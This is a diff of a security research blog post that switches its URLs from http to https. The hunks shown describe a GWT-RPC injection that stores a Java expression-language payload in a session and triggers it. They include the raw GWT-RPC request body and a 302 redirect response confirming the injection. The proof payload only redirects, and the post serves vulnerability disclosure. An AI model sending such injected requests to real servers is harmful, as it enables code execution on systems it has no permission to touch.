@@ -135,10 +135,10 @@ The oracle documentation states that you can use the [**getExternalContext**](ht
 Therefore, we could set the string to the following Java code:
 
 {% highlight java %}
-facesContext.getExternalContext().redirect("http://srcincite.io/");
+facesContext.getExternalContext().redirect("https://srcincite.io/");
 {% endhighlight %}
 
-...and if the response was a 302 redirect to **http://srcincite.io/** then we can confirm the code is vulnerable.
+...and if the response was a 302 redirect to **https://srcincite.io/** then we can confirm the code is vulnerable.
 
 #### Testing the vulnerability
 
@@ -154,7 +154,7 @@ Cookie: JSESSIONID=[cookie]
 Content-Type: text/x-gwt-rpc; charset=UTF-8
 Content-Length: 195
 
-6|0|6||45D7850B2B5DB917E4D184D52329B5D9|com.aaa.bbb.ccc.ddd.client.SomeService|sendBeanName|java.lang.String|facesContext.getExternalContext().redirect("http://srcincite.io/")|1|2|3|4|1|5|6|
+6|0|6||45D7850B2B5DB917E4D184D52329B5D9|com.aaa.bbb.ccc.ddd.client.SomeService|sendBeanName|java.lang.String|facesContext.getExternalContext().redirect("https://srcincite.io/")|1|2|3|4|1|5|6|
 {% endhighlight %}
 
 With a server response of **//OK[[],0,6]** we know that our GWT injection was successful. Then, the second request to trigger the *stored* in a session string, expression language injection. However, before we send that request, since we are using complex types for the **setMibNodesInfo** function, we need to look up the policy file that defines the available types allowed to send. Within the **[strong name].gwt.rpc** file, I found the following type value for ArrayList: **java.util.ArrayList/382197682**.
@@ -185,7 +185,7 @@ Pragma: no-cache
 Cache-Control: no-cache
 Expires: Thu, 01 Jan 1970 00:00:00 GMT
 Pragma: no-cache
-Location: http://srcincite.io/
+Location: https://srcincite.io/
 Content-Type: text/html;charset=UTF-8
 Content-Length: 45
 Date: Wed, 03 May 2017 18:58:36 GMT
